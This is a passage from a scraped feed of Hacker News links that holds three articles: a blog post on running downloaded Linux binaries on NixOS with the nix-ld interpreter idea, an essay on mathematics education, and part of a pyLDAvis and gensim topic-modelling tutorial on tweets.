  <p>This is a write up of some discussion ongoing with some folks on the <a href="irc://irc.freenode.net/nix-community">#nix-community</a> IRC chat primarily being driven by <a href="https://github.com/Mic92">Mic92</a>.</p>
</blockquote>

<p>Nixpkgs maintains the highest rating on <a href="https://repology.org/">Repology</a> for having the most packages &amp; which are up to date. Unfortunately even with the current ecosystem of packages, there will always be gaps, and for beginners in NixOS a common question is:</p>

<p><em>â€œIâ€™ve download a binary and would like to run it on NixOSâ€</em></p>

<blockquote>
  <p>Take a look at this graph <a href="https://repology.org/repositories/graphs">https://repology.org/repositories/graphs</a></p>
</blockquote>

<p><img src="https://fzakaria.com/assets/images/repology.svg" alt="repology graph"></p>

<p><strong>Can we do better &amp; streamline running non-Nix software?</strong> ğŸ¤”</p>

<p>This was some of the questions posed by some Nix contributors and I wanted to capture the ideas put forward for others.</p>

<!--more-->

<h2 id="a-brief-tour-of-linking">A brief tour of linking</h2>

<p>Without going into a ton of detail about how dynamic libraries are performed on Linux; a Linux binary - <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF format</a> - contains information pertaining to the dynamic libraries necessary for the binary.</p>

<p>For instance, here is a non-NixOS Ruby installation.</p>
<div><div><pre><code>â¯ readelf <span>-d</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>NEEDED
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libruby-2.7.so.2.7]
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libc.so.6]
</code></pre></div></div>
<p>It requires two dynamic libraries <em>libruby</em> &amp; <em>libc</em>. These libraries may themselves have other dependencies, so we can use <strong>ldd</strong> to recursively find the dependency closure.</p>

<div><div><pre><code>â¯ ldd <span>$(</span>which ruby<span>)</span>
    linux-vdso.so.1 <span>(</span>0x00007ffed1705000<span>)</span>
    /lib/x86_64-linux-gnu/libnss_cache.so.2 <span>(</span>0x00007f3626cd0000<span>)</span>
    libruby-2.7.so.2.7 <span>=&gt;</span> /lib/x86_64-linux-gnu/libruby-2.7.so.2.7 <span>(</span>0x00007f3626960000<span>)</span>
    libc.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libc.so.6 <span>(</span>0x00007f362679b000<span>)</span>
    libpthread.so.0 <span>=&gt;</span> /lib/x86_64-linux-gnu/libpthread.so.0 <span>(</span>0x00007f3626779000<span>)</span>
    librt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/librt.so.1 <span>(</span>0x00007f362676e000<span>)</span>
    libgmp.so.10 <span>=&gt;</span> /lib/x86_64-linux-gnu/libgmp.so.10 <span>(</span>0x00007f36266eb000<span>)</span>
    libdl.so.2 <span>=&gt;</span> /lib/x86_64-linux-gnu/libdl.so.2 <span>(</span>0x00007f36266e3000<span>)</span>
    libcrypt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/libcrypt.so.1 <span>(</span>0x00007f36266a8000<span>)</span>
    libm.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libm.so.6 <span>(</span>0x00007f3626564000<span>)</span>
    /lib64/ld-linux-x86-64.so.2 <span>(</span>0x00007f3626cde000<span>)</span>
</code></pre></div></div>

<p>We can see here that <strong>ldd</strong> resolved the libraries to locations in my <a href="https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard">Filesystem Hierarchy Standard</a>(FHS).</p>

<p>This is <em>not hermetic</em>, as the FHS is a global shared state across my machine.
This is the exact problem that Nix itself wants to address.</p>

<blockquote>
  <p>Iâ€™m on a Debian distro at the moment.</p>
</blockquote>

<p>Nix addresses this generally by patching the ELF header to <em>fully specify</em> where the shared libraries can be found in the <em>/nix/store</em>; so that they are not resolved or searched on the FHS.</p>

<div><div><pre><code>â¯ readelf -d $(which ruby) | grep RUNPATH
 0x000000000000001d (RUNPATH) Library runpath:
 [/nix/store/z5lira1853d97gbmv1qbdjjpkjn7ksj8-ruby-2.6.6/lib:
 /nix/store/8fcxqg8dmwlkjw2vgkgz607kr5jy552w-zlib-1.2.11/lib:
 /nix/store/kah5n342wz4i0s9lz9ka4bgz91xa2i94-glibc-2.32/lib]
</code></pre></div></div>

<p>This <em>patching</em> however relies on the Nix <em>stdenv</em> derivation builder and ultimately is what makes binaries in Nix work.</p>

<blockquote>
  <p>Nix actually takes it a step further and patches the linker so that it does not even try to check the FHS.</p>
</blockquote>

<p>Binaries downloaded from the Internet are not patched. What can be done?</p>

<h2 id="interpreter">Interpreter</h2>

<p>A key insight into the bootstrapping of an ELF binary in Linux is the <em>interpreter</em>, whose presence is there to help satisfy any dynamic linkage.</p>

<p>Letâ€™s take a look again at my non-Nix Ruby binary</p>

<div><div><pre><code>â¯ readelf <span>-l</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>interpreter
      <span>[</span>Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
</code></pre></div></div>

<blockquote>
  <p>Nix built binaries use a <a href="https://github.com/NixOS/patchelf">patchelf</a> utility that not only sets the <em>RUNPATH</em> to pin libraries but also changes the interpreter to one in the <em>/nix/store</em></p>
</blockquote>

<p>It is the interpreterâ€™s goal to find the libraries listed in the ELF file either via the <em>RUNPATH</em>, <em>LD_LIBRARY_PATH</em> or the <em>FHS</em> well known directories.</p>

<p>âš ï¸ On NixOS <code>/lib64/ld-linux-x86-64.so.2</code> normally <strong>does not exist</strong> and as a result you will be greeted with an unfriendly <em>â€œbad ELF interpreter: No such file or directoryâ€</em> error.</p>

<h2 id="nix-ld">nix-ld</h2>

<p>We have a binary that needs some shared libraries &amp; the bootstrapping process calls out to the interpreter set in the ELF header.</p>

<p>ğŸ’¡ Letâ€™s put a <em>fake</em> interpreter on NixOS machines!</p>

<blockquote>
  <p>This idea works since the path of Linux <em>ld</em> is well known for each distribution.</p>
</blockquote>

<p>For instance, NixOS machines can place an entry at <em>/lib64/ld-linux-x86-64.so.2</em> for a custom binary that can help resolve dynamic libraries <strong>at runtime</strong> to libraries within the <em>/nix/store</em>.</p>

<p>This is in fact what <a href="https://github.com/Mic92">Mic92</a> has started with his project <a href="https://github.com/Mic92/nix-ld">nix-ld</a>.</p>

<p>How can our custom <em>ld</em> locate the necessary libraries though? This is where we can get really crazy. ğŸ¤ª</p>

<p>We can use <a href="https://github.com/bennofs/nix-index">nix-index</a> â€“ a files database for nixpkgs â€“ to locate packages in Nix that provide the necessary library. ğŸ¤¯</p>

<p>The packages can be realized on-demand onto the host and their <em>/nix/store</em> entry can then be included into the <em>LD_LIBRARY_PATH</em> environment variable set when handing off to the <em>real ld</em>.</p>

<blockquote>
  <p>If gc-roots are set for the required libraries, this determination can then be cached for a given binary.</p>
</blockquote>

<p>Fancier best-effort matching on picking packages that have the highest % of required symbols could also be done.</p>

<p>It seems kind of crazy that just picking random packages from the <em>nix-index</em> would ultimately let us run the binary; except that is how traditional software in Linux normally works! ğŸ˜±</p>

<p>At worst it is providing the same experience users typically experience on non-NixOS distributions but giving a gentler onboarding for people as they see the Nix-light ğŸ˜‡</p>


<hr>
    </article></div>]]>
            </description>
            <link>https://fzakaria.com/2020/11/17/on-demand-linked-libraries-for-nix.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150572</guid>
            <pubDate>Thu, 19 Nov 2020 15:39:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Unreasonable Ineffectiveness of Mathematics Education (2012)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150503">thread link</a>) | @dredmorbius
<br/>
November 19, 2020 | https://www.refsmmat.com/posts/2012-10-19-unreasonable-math.html | <a href="https://web.archive.org/web/*/https://www.refsmmat.com/posts/2012-10-19-unreasonable-math.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<header>
  
  
  <span><a href="https://www.refsmmat.com/blog.html">the refsmmat report</a> Â· a blog at <a rel="me" href="https://www.refsmmat.com/">refsmmat.com</a></span>
</header>

<p><em>Revised October 23 based on comments on <a href="https://news.ycombinator.com/item?id=4679539">Hacker News</a> and <a href="http://www.reddit.com/r/math/comments/11sw82/the_unreasonable_ineffectiveness_of_mathematics/">Reddit</a>.</em></p>
<p>In American schools, mathematics is taught as a dark art. Learn these sacred methods and you will become master of the ancient symbols. You must memorize the techniques to our satisfaction or your performance on the state standardized exams will be so poor that they will be forced to lower the passing grades. Never mind the foundational principles, proofs, or derivations â€“ youâ€™ll learn those in due course.</p>
<p>Why? Why do math? Because youâ€™ll <em>need</em> it, thatâ€™s why. Youâ€™ll use it in your physics classes. And Iâ€™m sure I can think of examples of how youâ€™ll use math in â€œreal lifeâ€, whatever your chosen career may be. Right? Right. I hear engineers have to know how to solve differential equations, for example, and before you can do differential equations you need to learn logarithms. So get back to chapter 14 and get working.</p>
<p>This is the message weâ€™re giving our children, and itâ€™s no wonder so few students develop an interest in mathematics. Ask any math major: Math isnâ€™t about memorizing some formulas and learning how to factor polynomials. Itâ€™sâ€¦ well, itâ€™s something much deeper. Itâ€™s fascinating. But what is it exactly?</p>
<section id="rules-rules-rules">

<p>The universe appears to work on rules. Gravity tends to pull us to the Earth in the same way every day. Light has behaved exactly the same way for millions of years. Objects in motion tend to stay in motion unless acted upon by an external force. Magnets and electricity obey the same laws now as they did in the 1860s, when Maxwell discovered the laws.</p>
<p>Much of the human world obeys rules as well. Interest and fees accumulate in bank accounts according to rules set down in extremely small font on pieces of paper immediately discarded by account-holders. Internet traffic piles up in buffers and gets routed to its destination according to complicated sets of standards. Engine control modules execute millions of lines of code to read sensor data and process the driverâ€™s instructions to keep pistons flailing in low-emissions synchrony. Aircraft autopilots use clever mathematical algorithms to decide how to keep long metal tubes with wings from falling out of the sky.</p>
<p>I could go on, but you get the idea. Many things follow predictable sets of rules. How can we precisely express these rules in a useful way?</p>
<p>We could use English (or Spanish, or whatever chosen language), but languages are notoriously ambiguous and tricky to work with. It would take many pages to precisely describe Maxwellâ€™s equations of electrodynamics in English, and more importantly, the result would be impossible to work with.</p>
<p>After all, once the rules are set down youâ€™d like to put them to use: make predictions about the behavior of reality, invent new devices, or calculate how many more boxes of ramen noodles you can afford before your paycheck arrives.</p>
<p>How do I move from <em>general</em> rules about the world to <em>specific</em> rules that describe what will happen in one particular situation? With rules written in English, Iâ€™m limited to one method:<a href="#fn1" id="fnref1"><sup>1</sup></a></p>
<ol type="1">
<li>Write down the rules and the situation.</li>
<li>Think very hard.</li>
<li>Write down the answer.</li>
</ol>
<p>Thereâ€™s no system by which I manipulate a rule written in English and arrive at new facts about a specific situation. If I gave you a Monopoly rulebook, could you deduce the best properties to invest in, based on the expected likelihood of a player landing on each property? (If you must resort to written mathematics, you have proved my point.)</p>
<p>Rules arenâ€™t useful if we canâ€™t use them. Fortunately, we have mathematics.</p>
</section>
<section id="math-is-just-a-bunch-of-lego-bricks">

<p>Forget the mathematics you learned in school. Letâ€™s think of mathematics in the abstract. Mathematics, at its most basic, is a very simple set of very well-defined rules. The rules describe the behavior and interaction of certain completely imaginary objects. Upon these rules, mathematicians have built others. By combining rules, mathematicians demonstrate certain facts about these imaginary objects: when certain objects are arranged in certain ways, the rules show they must have certain properties.</p>
<p>On top of all these rules mathematicians have built a universe. Inhabiting this universe are various objects â€“ tensors, matrices, groups, Hilbert spaces, ordinary numbers, complex numbers, and so on and so forth â€“ which are defined by mathematicians by the sets of rules they follow. Many of these rules are in fact defined in terms of combinations of much simpler rules. If a mathematician wishes to know how a certain mathematical object behaves under certain circumstances, he must simply apply the simple rules in creative ways to discover what <em>must</em> be true.</p>
<p>Itâ€™s much like being handed an extraordinarily large and complex Lego brick creation and figuring out what it does and how it works. Lego bricks are exceedingly simple, and you understand exactly how they work. The ungainly creation youâ€™ve been given is made of Lego bricks, so you must simply take what you know about individual bricks and work out what happens when theyâ€™re put together. Soon enough you sort out what the stubby-looking bit on the left side does, and you no longer have to worry about the individual bricks: you just know that itâ€™s a frobnulator, and now you understand how frobnulators work. Eventually, with much work, you can deduce what the entire machine does, and write down a set of rules describing its behavior. You can forget about the individual bricks and worry only about the entire creation.</p>
<p>Objects of mathematical construction are much the same, although they are much less painful to step on.<a href="#fn2" id="fnref2"><sup>2</sup></a></p>
</section>
<section id="glued-legos">

<p>High school mathematics doesnâ€™t focus on the very basic rules and constructions of mathematics; they are very abstract, rigorously defined, and difficult to connect to physical reality. Our curriculum instead focuses on certain constructions that relate to reality. Geometry, for instance, is based on a very basic set of rules, but allows us to prove facts about real objects in three-dimensional space. A clever mathematician can wield the rules and basic facts to learn about all sorts of complicated shapes without ever leaving the two-dimensional world of a sheet of paper.</p>
<p>But that skill is not taught in high school. School mathematics is about memorizing the constructed mathematical objects, not learning how to wield the simple rules to build new objects and dissect their behavior.</p>
<p>High school mathematics, then, is much like being given a set of Lego airplanes which have been carefully glued together. You may learn how they work, but you do not have the tools to disassemble them and you havenâ€™t the faintest idea how to build a new one. Should you ever meet these airplanes again, your knowledge will be useful; otherwise, whatâ€™s the point? Itâ€™s just like an 8th-grader complaining that heâ€™ll never use the quadratic equation again in his life.</p>
<p>But what can you do with the basic rules of mathematics? Why do we care?</p>
<p>Weâ€™ve already discussed how many familiar parts of reality appear to follow rules. For many, like electromagnetism, we have no idea how the universe â€œknowsâ€ to follow these rules or why it must use these rules and not some other set. But we <em>can</em> construct complicated mathematical objects that in some ways are exactly analogous to physical objects. We can construct a mathematical object which represents an electric field, specify the rules it operates by, and use the rules to sort out what happens when a mathematical object representing an electron wanders by.</p>
<p>Or we could devise mathematical rules to represent the wobbling behavior of a plate spun and thrown in the air.<a href="#fn3" id="fnref3"><sup>3</sup></a></p>
<p>Or we could devise rules describing the grip of a car tire on a road surface in different atmospheric conditions.</p>
<p>Or rules describing how furniture can be arranged in the available space of your living room.</p>
<p>Or rules describing your retirement plan.</p>
<p>Or rules describingâ€¦ well, anything you can think of that seems to follow rules. Perhaps mathematicians havenâ€™t yet devised mathematical objects that behave in the right ways, or perhaps they have but do not understand how to manipulate them. Perhaps you can write down a set of rules but itâ€™s so horribly complicated that it would take a computer years to determine what will happen ten seconds after you flip a switch. But the rules exist, and mathematics, one way or another, can probably describe them.</p>
<p>Some justify mathematics education as a way to teach students to think critically; thatâ€™s good, but they could also analyze essays and literature or study logic for that. We should not teach our students so they can be human calculators and perform simple arithmetic; that is important, but it is hardly the most useful part of mathematics.</p>
<p>We should teach our students mathematics because they can use it to describe reality. They can use it to discover facts about the universe. Facts about their retirement funds, their living rooms, and the rate of fish food consumption in their fish tanks.</p>
<p>Mathematics is a tool to explore reality. We should teach our students to use it.</p>
</section>
<section>
<hr>
<ol>
<li id="fn1"><p>This method is also known as the Feynman Problem-Solving Algorithm, but it only works if you are Richard Feynman.<a href="#fnref1">â†©</a></p></li>
<li id="fn2"><p>Though I once sprained an ankle stepping on a perturbed Hamiltonian.<a href="#fnref2">â†©</a></p></li>
<li id="fn3"><p>Where by â€œweâ€ I really mean <a href="http://www.physics.ohio-state.edu/~kilcup/262/feynman.html">Richard Feynman</a>.<a href="#fnref3">â†©</a></p></li>
</ol>
</section>




</div>]]>
            </description>
            <link>https://www.refsmmat.com/posts/2012-10-19-unreasonable-math.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150503</guid>
            <pubDate>Thu, 19 Nov 2020 15:32:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PyLDAvis: Topic Modelling Exploration Tool Every NLP Data Scientist Should Know]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150399">thread link</a>) | @patrycjaneptune
<br/>
November 19, 2020 | https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know | <a href="https://web.archive.org/web/*/https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <article class="page">
	
<p>Have you ever wanted to classify news, papers, or tweets based on their topics? Knowing how to do this can help you filter out irrelevant documents, and save time by reading only what youâ€™re interested in.</p>



<p>Thatâ€™s what text classification is for â€“ allows you to train your model to recognize topics. This technique allows you to use data labels to train your model, and itâ€™s supervised learning.</p>



<div><figure><img loading="lazy" width="461" height="200" src="https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?resize=461%2C200&amp;ssl=1" alt="text classification" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?w=461&amp;ssl=1 461w, https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?resize=300%2C130&amp;ssl=1 300w" sizes="(max-width: 461px) 100vw, 461px" data-recalc-dims="1"></figure></div>



<p>In real life, you might not have data labels for text classification. You can go through each document to label them, or hire somebody else to do it, but thatâ€™s a lot of time and money, especially when you have more than 1000 data points.</p>



<p>Can you find the topics of your documents without training data? Yes, you can use topic modeling to do it.</p>






<h2>What is topic modeling?</h2>



<p>With <a href="https://towardsdatascience.com/end-to-end-topic-modeling-in-python-latent-dirichlet-allocation-lda-35ce4ed6b3e0" target="_blank" rel="noreferrer noopener nofollow">topic modeling</a>, you can cluster words for a set of documents. This is unsupervised learning, because it automatically groups words without a predefined list of labels.</p>



<p>If you feed the model data, it will give you different sets of words, and each set of words describes the topic.</p>



<pre>(<span>0</span>, <span>'0.024*</span><span>"ban"</span> + <span>0.017</span>*<span>"order"</span> + <span>0.015</span>*<span>"refugee"</span> + <span>0.015</span>*<span>"law"</span> + <span>0.013</span>*<span>"trump"</span> '
 <span>'+</span> <span>0.011</span>*<span>"kill"</span> + <span>0.011</span>*<span>"country"</span> + <span>0.010</span>*<span>"attack"</span> + <span>0.009</span>*<span>"state"</span> + '
 <span>'0.009*</span><span>"immigration"</span>')
(<span>1</span>, <span>'0.020*</span><span>"student"</span> + <span>0.020</span>*<span>"work"</span> + <span>0.019</span>*<span>"great"</span> + <span>0.017</span>*<span>"learn"</span> + '
  <span>'0.017*</span><span>"school"</span> + <span>0.015</span>*<span>"talk"</span> + <span>0.014</span>*<span>"support"</span> + <span>0.012</span>*<span>"community"</span> + '
  <span>'0.010*</span><span>"share"</span> + <span>0.009</span>*<span>"event"</span>)</pre>



<p>When you look at the first set of words, you would guess the topic is military and politics.&nbsp;Looking at the second set of words, you might guess the topic is public events, or school.</p>



<p>This is quite useful. Your texts are automatically categorized, without the need to label them!</p>






<h2>Visualize topic modeling with pyLDAvis</h2>



<p>Topic modeling is useful, but itâ€™s difficult to understand it just by looking at a combination of words and numbers like above.</p>



<p>One of the most effective ways to understand data is through visualization. Is there a way that we can visualize the results of LDA? Yes, we can with<a href="https://github.com/bmabey/pyLDAvis" target="_blank" rel="noreferrer noopener nofollow"> pyLDAvis</a>.</p>



<p>PyLDAvis allows us to interpret the topics in a topic model like below:</p>



<div><figure><img loading="lazy" width="1024" height="620" src="https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=1024%2C620&amp;ssl=1" alt="PyLDAvis " srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=1024%2C620&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=300%2C182&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=768%2C465&amp;ssl=1 768w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p>Pretty cool, isnâ€™t it? <strong>Now we will learn how to use topic modeling and pyLDAvis to categorize tweets and visualize the results. Weâ€™ll analyze </strong><a href="https://datapane.com/u/khuyentran1401/reports/tweets/" target="_blank" rel="noreferrer noopener nofollow"><strong>a real Twitter dataset containing 6000 tweets.</strong></a>&nbsp;</p>



<p>Letâ€™s see what topics we can find.</p>



<figure></figure>






<h2>How to start with pyLDAvis and how to use it</h2>



<p>Install pyLDAvis with:</p>



<pre>pip install pyldavis</pre>



<p>The script to process the data can be found <a href="https://ui.neptune.ai/khuyentran1401/sandbox/n/ac75203d-2de0-4bbf-a559-ec7763d919d8/e7960ea4-c002-4ea6-949f-8964c1e33491" target="_blank" rel="noreferrer noopener nofollow">here</a>. Download the <a href="https://datapane.com/u/khuyentran1401/reports/processed_tweets/" target="_blank" rel="noreferrer noopener nofollow">data after being processed</a>.</p>



<p>Moving on, letâ€™s import relevant libraries:</p>



<pre><span>import</span> gensim
<span>import</span> gensim.corpora <span>as</span> corpora
<span>from</span> gensim.corpora <span>import</span> Dictionary
<span>from</span> gensim.models.coherencemodel <span>import</span> CoherenceModel
<span>from</span> gensim.models.ldamodel <span>import</span> LdaModel

<span>from</span> pprint <span>import</span> pprint

<span>import</span> spacy

<span>import</span> pickle
<span>import</span> re 
<span>import</span> pyLDAvis
<span>import</span> pyLDAvis.gensim

<span>import</span> matplotlib.pyplot <span>as</span> plt 
<span>import</span> pandas <span>as</span> pd</pre>



<p>If you want to get access to the data above and follow along with the article, download the data and put the data in your current directory, then run:</p>



<pre>tweets = pd.read_csv(<span>'dp-export-8940.csv'</span>) 
tweets = tweets.Tweets.values.tolist()


tweets = [t.split(<span>','</span>) <span>for</span> t <span>in</span> tweets]</pre>






<h2>How to use LDA Model</h2>



<p>Topic modeling involves counting words and grouping similar word patterns to describe topics within the data. If the model knows the word frequency, and which words often appear in the same document, it will discover patterns that can group different words together.</p>



<p>We start with converting a collection of words to a bag of words, which is a list of tuples (word_id, word_frequency). <strong>gensim.corpora.Dictionary</strong> is a great tool for this:</p>



<pre>id2word = Dictionary(tweets)

corpus = [id2word.doc2bow(text) <span>for</span> text <span>in</span> tweets]
print(corpus[:<span>1</span>])

[[(<span>0</span>, <span>1</span>), (<span>1</span>, <span>1</span>), (<span>2</span>, <span>1</span>), (<span>3</span>, <span>3</span>), (<span>4</span>, <span>1</span>), (<span>5</span>, <span>2</span>), (<span>6</span>, <span>2</span>), (<span>7</span>, <span>1</span>), (<span>8</span>, <span>1</span>), (<span>9</span>, <span>1</span>), (<span>10</span>, <span>1</span>), (<span>11</span>, <span>2</span>), (<span>12</span>, <span>2</span>), (<span>13</span>, <span>1</span>), (<span>14</span>, <span>1</span>), (<span>15</span>, <span>1</span>), (<span>16</span>, <span>2</span>), (<span>17</span>, <span>1</span>), (<span>18</span>, <span>1</span>), (<span>19</span>, <span>1</span>), (<span>20</span>, <span>2</span>), (<span>21</span>, <span>1</span>), (<span>22</span>, <span>1</span>), (<span>23</span>, <span>1</span>), (<span>24</span>, <span>1</span>), (<span>25</span>, <span>2</span>), (<span>26</span>, <span>1</span>), (<span>27</span>, <span>1</span>), (<span>28</span>, <span>1</span>), (<span>29</span>, <span>1</span>), (<span>30</span>, <span>1</span>), (<span>31</span>, <span>1</span>), (<span>32</span>, <span>1</span>), ... , (<span>347</span>, <span>1</span>), (<span>348</span>, <span>1</span>), (<span>349</span>, <span>2</span>), (<span>350</span>, <span>1</span>), (<span>351</span>, <span>1</span>), (<span>352</span>, <span>1</span>), (<span>353</span>, <span>1</span>), (<span>354</span>, <span>1</span>), (<span>355</span>, <span>1</span>), (<span>356</span>, <span>1</span>), (<span>357</span>, <span>1</span>), (<span>358</span>, <span>1</span>), (<span>359</span>, <span>1</span>), (<span>360</span>, <span>1</span>), (<span>361</span>, <span>1</span>), (<span>362</span>, <span>2</span>), (<span>363</span>, <span>1</span>), (<span>364</span>, <span>4</span>), (<span>365</span>, <span>1</span>), (<span>366</span>, <span>1</span>), (<span>367</span>, <span>3</span>), (<span>368</span>, <span>1</span>), (<span>369</span>, <span>8</span>), (<span>370</span>, <span>1</span>), (<span>371</span>, <span>1</span>), (<span>372</span>, <span>1</span>), (<span>373</span>, <span>4</span>)]]</pre>



<p>What do these tuples mean? Letâ€™s convert them into human readable format to understand:</p>



<pre>[[(id2word[i], freq) <span>for</span> i, freq <span>in</span> doc] <span>for</span> doc <span>in</span> corpus[:<span>1</span>]]

[[(<span>"'d"</span>, <span>1</span>),
  (<span>'-'</span>, <span>1</span>),
  (<span>'absolutely'</span>, <span>1</span>),
  (<span>'aca'</span>, <span>3</span>),
  (<span>'act'</span>, <span>1</span>),
  (<span>'action'</span>, <span>2</span>),
  (<span>'add'</span>, <span>2</span>),
  (<span>'administrative'</span>, <span>1</span>),
  (<span>'affordable'</span>, <span>1</span>),
  (<span>'allow'</span>, <span>1</span>),
  (<span>'amazing'</span>, <span>1</span>),
...
  (<span>'way'</span>, <span>4</span>),
  (<span>'week'</span>, <span>1</span>),
  (<span>'well'</span>, <span>1</span>),
  (<span>'will'</span>, <span>3</span>),
  (<span>'wonder'</span>, <span>1</span>),
  (<span>'work'</span>, <span>8</span>),
  (<span>'world'</span>, <span>1</span>),
  (<span>'writing'</span>, <span>1</span>),
  (<span>'wrong'</span>, <span>1</span>),
  (<span>'year'</span>, <span>4</span>)]]</pre>



<p>Now letâ€™s build an LDA topic model. We will use <a href="https://radimrehurek.com/gensim/models/ldamodel.html#gensim.models.ldamodel.LdaModel" target="_blank" rel="noreferrer noopener nofollow">gensim.models.ldamodel.LdaModel</a> for this:</p>



<pre>
lda_model = LdaModel(corpus=corpus,
                   id2word=id2word,
                   num_topics=<span>10</span>, 
                   random_state=<span>0</span>,
                   chunksize=<span>100</span>,
                   alpha=<span>'auto'</span>,
                   per_word_topics=<span>True</span>)

pprint(lda_model.print_topics())
doc_lda = lda_model[corpus]
</pre>



<p>There seem to be some <strong>patterns</strong> here. The first topic may be politics, and the second topic may be sport, but the pattern is not clear.</p>



<pre>[(<span>0</span>,
 <span>'0.017*"go" + 0.013*"think" + 0.013*"know" + 0.010*"time" + 0.010*"people" + '</span>
 <span>'0.008*"good" + 0.008*"thing" + 0.007*"feel" + 0.007*"need" + 0.007*"get"'</span>),
(<span>1</span>,
 <span>'0.020*"game" + 0.019*"play" + 0.019*"good" + 0.013*"win" + 0.012*"go" + '</span>
 <span>'0.010*"look" + 0.010*"great" + 0.010*"team" + 0.010*"time" + 0.009*"year"'</span>),
(<span>2</span>,
 <span>'0.029*"video" + 0.026*"new" + 0.021*"like" + 0.020*"day" + 0.019*"today" + '</span>
 <span>'0.015*"check" + 0.014*"photo" + 0.009*"post" + 0.009*"morning" + '</span>
 <span>'0.009*"year"'</span>),
(<span>3</span>,
 <span>'0.186*"more" + 0.058*"today" + 0.021*"pisce" + 0.016*"capricorn" + '</span>
 <span>'0.015*"cancer" + 0.015*"aquarius" + 0.013*"arie" + 0.008*"feel" + '</span>
 <span>'0.008*"gemini" + 0.006*"idea"'</span>),
(<span>4</span>,
 <span>'0.017*"great" + 0.011*"new" + 0.010*"thank" + 0.010*"work" + 0.008*"good" + '</span>
 <span>'0.008*"look" + 0.007*"how" + 0.006*"learn" + 0.005*"need" + 0.005*"year"'</span>),
(<span>5</span>,
 <span>'0.028*"thank" + 0.026*"love" + 0.017*"good" + 0.013*"day" + 0.010*"year" + '</span>
 <span>'0.010*"look" + 0.010*"happy" + 0.010*"great" + 0.010*"time" + 0.009*"go"'</span>)]
</pre>



<p>Letâ€™s use pyLDAvis to visualize the topics:</p>



<div><figure><img loading="lazy" width="1024" height="620" src="https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=1024%2C620&amp;ssl=1" alt="PyLDAvis visualization" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=1024%2C620&amp;ssl=1 1024w, https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=300%2C182&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=768%2C465&amp;ssl=1 768w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p>Click <a href="https://ui.neptune.ai/khuyentran1401/sandbox/n/Topic-modeling-b25db361-8995-42ee-bd50-6f03fa8d5847/65d94d91-43e9-4c21-bee6-8a9bf7584087#ldavis_el55571398076541038884947444595" target="_blank" rel="noreferrer noopener nofollow">here</a> to interact with the visualization yourself.</p>



<ul><li>Each bubble represents a topic. The larger the bubble, the higher percentage of the number of tweets in the corpus is about that topic.</li><li>Blue bars represent the overall frequency of each word in the corpus. If no topic is selected, the blue bars of the most frequently used words will be displayed.</li><li>Red bars give the estimated number of times a given term was generated by a given topic. As you can see from the image below, there are about 22,000 of the word â€˜goâ€™, and this term is used about 10,000 times within topic 1. The word with the longest red bar is the word that is used the most by the tweets belonging to that topic.</li></ul>



<div><figure><img loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=596%2C648&amp;ssl=1" alt="PyLDAvis visualization" width="596" height="648" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?w=794&amp;ssl=1 794w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=276%2C300&amp;ssl=1 276w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=768%2C836&amp;ssl=1 768w" sizes="(max-width: 596px) 100vw, 596px" data-recalc-dims="1"></figure></div>



<ul><li>The further the bubbles are away from each other, the more different they are. For example, it is difficult to tell the difference between topics 1 and 2. They seem to be both about social life, but it is much easier to tell the difference between topics 1 and 3. We can tell that topic 3 is about politics.</li></ul>



